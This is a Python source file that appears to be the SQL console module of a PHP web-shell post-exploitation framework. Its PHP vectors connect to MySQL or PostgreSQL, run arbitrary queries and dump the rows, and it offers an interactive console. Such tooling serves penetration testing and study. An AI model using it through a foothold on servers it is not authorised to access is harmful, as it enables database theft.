from core.vectors import PhpCode, ShellCmd, ModuleExec, Os
from core.module import Module
from core.loggers import log
from core import modules
from core import messages
from core import utilities

class Console(Module):

    """Execute SQL query or run console."""

    def init(self):

        self.register_info(
            {
                'author': [
                    'Emilio Pinna'
                ],
                'license': 'GPLv3'
            }
        )


        self.register_vectors(
            [
            PhpCode(
              """if(mysql_connect("${host}","${user}","${passwd}")){$r=mysql_query("${query}");if($r){while($c=mysql_fetch_row($r)){foreach($c as $key=>$value){echo $value."\x00";}echo "\n";}};mysql_close();}""",
              name = 'mysql',
            ),
            PhpCode("""$r=mysql_query("${query}");if($r){while($c=mysql_fetch_row($r)){foreach($c as $key=>$value){echo $value."\x00";}echo "\n";}};mysql_close();""",
              name = "mysql_fallback"
            ),
            PhpCode( """if(pg_connect("host=${host} user=${user} password=${passwd}")){$r=pg_query("${query}");if($r){while($c=pg_fetch_row($r)){foreach($c as $key=>$value){echo $value."\x00";}echo "\n";}};pg_close();}""",
              name = "pgsql"
            ),
            PhpCode( """$r=pg_query("${query}");if($r){while($c=pg_fetch_row($r)){foreach($c as $key=>$value){echo $value."\x00";} echo "\n";}};pg_close();""",
              name = "pgsql_fallback"
            ),
            ]
        )

        self.register_arguments([
          { 'name' : '-user', 'help' : 'SQL username' },
          { 'name' : '-passwd', 'help' : 'SQL password' },
          { 'name' : '-host', 'help' : 'Db host or host:port', 'nargs' : '?', 'default' : '127.0.0.1' },
          { 'name' : '-dbms', 'help' : 'Db type', 'choices' : ('mysql', 'pgsql'), 'default' : 'mysql' },
          { 'name' : '-query', 'help' : 'Execute a single query' },
        ])

    def _query(self, vector, args):

        result = self.vectors.get_result(vector, args)

        if result:
            return [
              line.split('\x00') for line
              in result.strip('\x00').replace('\x00\n', '\n').split('\n')
            ]

        # If the result is none, prints error message about missing trailer
        command_last_chars = utilities.shorten_string(args['query'].rstrip(),
                                                        keep_trailer = 10)

        if (command_last_chars and command_last_chars[-1] != ';'):
            log.warn(messages.module_sql_console.missing_sql_trailer_s % command_last_chars)


    def run(self, args):

        # The vector name is given by the db type
        vector = args.get('dbms')

        # And by the user and password presence
        vector += (
                    '' if args.get('user') and args.get('passwd')
                    else '_fallback'
                )

        # If the query is set, just execute it
        if args.get('query'):
            return self._query(vector, args)

        # Else, start the console.
        # Check credentials
        args['query'] = (
                    'SELECT USER;' if vector.startswith('pgsql')
                    else 'SELECT USER();'
                )

        user = self._query(vector, args)
        if not user:
            log.warn(messages.module_sql_console.check_credentials)
            return

        if user[0]:
            user = user[0][0]

        # Catch Ctrl-C and Ctrl-D
        try:

            # Console loop
            while True:

                query = raw_input('%s SQL> ' % user).strip()

                if not query: continue
                if query == 'quit': break

                args['query'] = query
                result = self._query(vector, args)
                self.print_result(result)


        except (KeyboardInterrupt, EOFError):
            log.info('Exiting SQL console.')


    def print_result(self, result):

        if result == None:
            log.warn('%s %s' % (messages.module_sql_console.no_data,
                                messages.module_sql_console.check_credentials)
                    )
        elif not result:
            log.warn(messages.module_sql_console.no_data)
        else:
            Module.print_result(self, result)
